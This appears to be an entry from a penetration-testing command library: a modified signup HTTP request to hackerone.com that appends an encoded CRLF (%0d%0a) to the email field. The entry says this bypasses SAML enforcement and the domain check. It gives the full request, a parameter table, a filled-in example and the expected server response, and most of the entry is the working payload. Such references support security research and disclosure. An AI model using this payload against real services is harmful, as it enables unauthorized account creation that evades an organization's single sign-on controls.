---
data: >-
  POST /users HTTP/1.1

  Host: hackerone.com

  ...

  user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com%0d%0a&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
tags:
  - http
  - post
  - bypass
type: command
executor: bash
platforms:
  - Web
id: bfd3b7e2-8e30-420a-b6c5-f99d35b34b11
created_at: '2025-12-13T09:01:26.708Z'
updated_at: '2025-12-13T09:01:26.708Z'
verified: false
validated: true
submitted: true
---
# Modified Signup POST Request

## Command

```bash
POST /users HTTP/1.1
Host: hackerone.com
...
user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com%0d%0a&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

## Description

Modified signup request that bypasses SAML enforcement by appending %0d%0a to the email.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `user[email]` | Email address with appended %0d%0a to bypass domain check | Yes |
| `user[name]` | Full name | Yes |
| `user[username]` | Username | Yes |
| `user[password]` | Password | Yes |
| `user[password_confirmation]` | Password confirmation | Yes |

## Examples

### Basic Usage

```bash
POST /users HTTP/1.1
Host: hackerone.com
...
user%5Bname%5D=Test&user%5Busername%5D=testuser&user%5Bemail%5D=x@hackerone.com%0d%0a&user%5Bpassword%5D=pass123&user%5Bpassword_confirmation%5D=pass123
```

## Expected Output

{"redirect_path":"/users/sign_in","errors":{}}

## Related

- [[commands/normal-signup-post-request]]
- [[procedures/Bypass-SAML-Signup-Enforcement]]
